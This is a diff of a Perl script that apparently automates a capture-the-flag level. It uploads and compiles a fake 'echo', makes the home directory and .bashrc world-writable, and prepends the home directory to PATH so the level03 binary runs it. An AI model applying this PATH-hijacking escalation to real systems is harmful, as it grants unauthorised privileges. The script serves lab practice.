@@ -7,15 +7,11 @@ $red = "\e[31m";
 $green = "\e[32m";
 $reset = "\e[0m";
 
+$scp = "scp -q -P 4242 ./echo.c $user\@$ip:~";
+print $green, $scp, $reset, "\n";
+system($scp);
+
 $path = "PATH=~:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
-$input = "chmod 777 . && chmod 777 .bashrc && echo $path > .bashrc";
+$input = "echo $path > .bashrc && gcc echo.c -o echo && ./level03";
 print $red, $input, $reset, "\n";
-system("ssh -qp 4242 $user\@$ip '$input'");
-
-$scp2 = "scp -q -P 4242 ./echo.c $user\@$ip:~";
-print $green, $scp2, $reset, "\n";
-system($scp2);
-
-$tool = "gcc echo.c -o echo && ./level03";
-print $red, $tool, $reset, "\n";
-system("ssh -qp 4242 $user\@$ip '$tool'");
+system("ssh -qp 4242 $user\@$ip 'chmod 777 . && chmod 777 .bashrc && $input'");
